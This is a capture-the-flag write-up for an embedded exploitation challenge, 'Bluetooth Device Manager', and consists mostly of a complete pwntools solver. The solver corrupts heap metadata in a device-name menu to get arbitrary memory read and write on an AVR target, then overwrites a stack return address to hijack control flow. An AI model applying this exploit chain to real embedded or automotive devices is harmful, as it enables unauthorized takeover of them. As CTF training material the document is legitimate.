# Bluetooth Device Manager, Exp, 200pts

> You have a basic car model and would like to enable some extra features? That navigation with traffic should be neat. Right. It is expensive, you know. Or not, if you can access the control interface. Try bluetooth this time. We think, it could be used for purposes other than making calls and playing MP3s.

Final solver:

```python
#!/usr/bin/python2

from pwn import *


def attack(connection):
    def send(bytes):
        for byte in bytes:
            connection.send(byte)
            connection.recvuntil(byte)

    def cmd_print():
        connection.recvuntil("5. Exit\n")
        send("1\n")
        result = connection.recvuntil("Choose one of the following: \n")
        return result

    def cmd_add_device(name, key):
        connection.recvuntil("5. Exit\n")
        send("2\n")
        connection.recvuntil("Enter device name: \n")
        send("{:s}\n".format(name))
        connection.recvuntil("Enter pairing key: \n")
        send("{:s}\n".format(key))

    def cmd_modify_device(id, name, key):
        connection.recvuntil("5. Exit\n")
        send("4\n")
        connection.recvuntil("Enter number of device: ")
        send("{:d}\n".format(id))
        connection.recvuntil("Enter new name: ")
        send("{:s}\n".format(name))
        if key is not None:
            connection.recvuntil("Enter new key: ")
            send("{:s}\n".format(key))

    def cmd_remove_device(id):
        connection.recvuntil("5. Exit\n")
        send("3\n")
        connection.recvuntil("Enter number of device: ")
        send("{:d}\n".format(id))

    cmd_add_device("AAA", "BBB")
    cmd_add_device("C" * 0x0b, "DDD")

    cmd_modify_device(0, "EEEE" + p16(0x1f), None)

    cmd_remove_device(0)

    buffer = StringIO()
    buffer.write(p8(1))
    buffer.write("F" * 4)
    buffer.write(p16(0x2289))
    buffer.write(p16(0x2030))
    buffer.write(p16(0x2290))
    cmd_add_device(buffer.getvalue(), "GGG")

    def write_memory(va, bytes):
        buffer = StringIO()
        buffer.write(p16(va))
        buffer.write(p16(0x2290))
        cmd_modify_device(1, buffer.getvalue(), bytes)

    def read_memory(va):
        buffer = StringIO()
        buffer.write(p16(va))
        buffer.write(p16(0x2290))
        write_memory(0x2289, buffer.getvalue())

        response = cmd_print()
        chunks = list()
        for byte in buffer.getvalue():
            if byte == "\x00":
                break
            chunks.append("\\x{:02x}".format(ord(byte)))
        name = "".join(chunks)
        match = re.match("^1\\. name: {0}, key: (?P<bytes>.*)\n2\\. name: \\x01FFFF\\x89\\x22{0}, key: GGG\nChoose one of the following: \n$".format(name), response, re.DOTALL)
        bytes = match.group("bytes")
        bytes += "\x00"

        info("read_memory(%04x) => %s", va, bytes.encode("hex"))

        return bytes

    sp = u16(read_memory(0x3fd9)[: 2])
    info("sp = %04x", sp)

    if read_memory(sp - 3) != "\x00":
        raise Exception
    if read_memory(sp - 2)[: 2] != "\x06\x13":
        raise Exception

    write_memory(0x2000, "\x0d\xf0\xad\xba\xa0\x08")

    context.log_level = "debug"

    write_memory(sp - 2, "\x01\x82")

    connection.recvuntil("FIXME")


#ith process(["/mnt/rhme3/dev/simavr/simavr/run_avr", "-m", "atmega2560", "-f", "1000000", "bluetooth_device_manager.hex"]) as connection:
with serialtube(port = sys.argv[1], baudrate = 115200, convert_newlines = False) as connection:
    attack(connection)
```